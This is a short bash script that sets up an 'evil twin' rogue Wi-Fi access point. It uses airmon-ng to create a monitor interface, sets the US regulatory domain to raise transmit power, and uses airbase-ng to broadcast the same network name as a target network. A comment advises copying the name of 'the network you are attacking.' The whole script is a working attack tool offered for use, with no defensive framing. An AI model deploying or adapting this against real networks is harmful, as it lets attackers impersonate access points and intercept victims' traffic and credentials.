#! /bin/bash

# this script sets up the evil twin access point

CONFIG="eviltwin.config"
if test -f $CONFIG ; then
	source $CONFIG
else
	echo "Error: Unable to find '${CONFIG}'."
fi

# Enable the wireless adapter
echo -e "Enabled $WLAN"
ifconfig $WLAN up

# create the monitor network interface
echo -e "Creating $WLAN monitor interface"
airmon-ng start $WLAN

# boost signal strength to max legal limit in the US, 30 dBm
echo -e "Boosting Signal Strength"
ifconfig $WLANMON down     
iw reg set US              
ifconfig $WLANMON up 

# start up the evil twin AP (access point)
# Give the evil twin the same name as the network you are attacking for best results
echo -e "Starting evil twin"
airbase-ng -e $ESSID -c $CHANNEL $WLANMON
